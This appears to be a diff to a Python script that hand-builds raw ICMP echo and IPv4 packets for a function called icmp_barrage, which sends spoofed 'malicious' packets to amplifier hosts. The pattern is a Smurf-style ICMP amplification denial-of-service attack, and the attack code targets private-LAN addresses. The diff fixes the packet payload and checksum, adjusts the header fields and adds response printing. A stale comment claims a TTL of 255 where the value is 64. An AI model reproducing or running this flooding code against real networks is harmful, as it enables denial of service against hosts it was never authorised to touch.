@@ -18,24 +18,24 @@ def construct_ICMP_packet():
 	''' Construct the core ICMP payload '''
 	ping_type = 0x08
 	ping_code = 0x00
-	identifier = 0 #os.getpid() & 0xffff
-	sequence = 0
+	identifier = os.getpid() & 0xffff
+	sequence = 1
+	data = b"abcdefghijklmnopqrstuvwxyzabcdef"
 	# serialize data with zeroed out checksum field
-	data = ping_type.to_bytes(1, byteorder) + ping_code.to_bytes(1, byteorder) + b'\x00\x00' + identifier.to_bytes(2, byteorder) + sequence.to_bytes(2, byteorder)
+	ser = ping_type.to_bytes(1, 'big') + ping_code.to_bytes(1, 'big') + b'\x00\x00' + identifier.to_bytes(2, 'big') + sequence.to_bytes(2, 'big') + data
 	# compute checksum
-	checksum = compute_checksum(data)
+	checksum = compute_checksum(ser)
 	# serialize ICMP packet with computed checksum
-	return struct.pack("!BBHHH", ping_type, ping_code, checksum, identifier, sequence)
+	return struct.pack("!BBHHH", ping_type, ping_code, checksum, identifier, sequence) + data
 
 def construct_IP_packet(src, dest, icmp):
 	''' Construct an IPv4 packet '''
-	# FIXME fill in IP packet address fields dynamically and compute checksum
 	v_ihl = 0x45 # set version number to 4 (IPv4) # set ihl value to 5 (no options field included)
 	tos = 0x00
-	length = 0x1c
+	length = 0x3c
 	ident = os.getpid() & 0xffff
 	flags = 0x00
-	ttl = 0xff # ttl set to max lifetime of 255
+	ttl = 0x40 # ttl set to max lifetime of 255
 	protocol = 0x01 # set to IP protocol 1 (ICMP)
 	header_chksm = 0x00 # compute header checksum
 	source_ip = socket.inet_aton(src)
@@ -78,6 +78,8 @@ def icmp_barrage(target, target_mac, amplifiers, amplifier_macs):
 		packet += checksum.to_bytes(4, byteorder)
 		# send malicious packet to the amplifier
 		sock.send(packet)
+		data = sock.recv(4096)
+		print(f'data: {data}')
 
 if __name__ == "__main__":
-	icmp_barrage('192.168.1.64', b'\x08\x11\x96\x19\xbe\xec', ['192.168.1.58'], [b'\xb8\x27\xeb\x22\x30\x40'])
+	icmp_barrage('192.168.1.62', b'', ['192.168.1.58'], [b''])
